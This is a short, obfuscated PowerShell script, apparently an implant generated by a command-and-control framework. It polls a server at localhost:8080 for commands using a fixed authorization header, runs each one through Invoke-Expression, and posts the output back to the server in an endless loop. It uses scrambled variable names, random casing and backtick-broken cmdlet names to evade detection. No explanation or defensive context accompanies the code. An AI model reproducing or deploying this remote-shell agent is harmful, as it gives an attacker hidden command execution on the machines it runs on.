
    FUNcTIoN cJNDES {
        
        $fLbifd = INVOkE-webReqUest "http://localhost:8080/getcommand/LdJqTg" -Headers @{"Authorization"="9775"}  
        RETURN $fLbifd.cONtENt 
    }
    FUNcTIoN mAQjNX([string]$tauZTU){
        $tauZTU  =(iex $tauZTU 2>&1 | Out-String )
        RETURN $tauZTU
    }
    FUNcTIoN hDshfT([string]$command){
    

        $iIWICe = @{DRyVyL=$command}
        $req = INVOkE-webReqUest "http://localhost:8080/response/lGKHmm" -Headers @{"Authorization"="9775"} -Method POST -Body $iIWICe 
    }
    $BzSeAq = 1
    
    wHIlE ($BzSeAq -LE 5 -ANd $BzSeAq -NE 3)
    {
        $tauZTU = cJNDES
        if($tauZTU.Trim() -eq "none"){
        Start-S`lee`P -s 2
    
        }
        else{
        $tauZTU = mAQjNX($tauZTU)
        hDshfT($tauZTU)
    
        }
        
        Start-S`lee`P -s 2
    }
    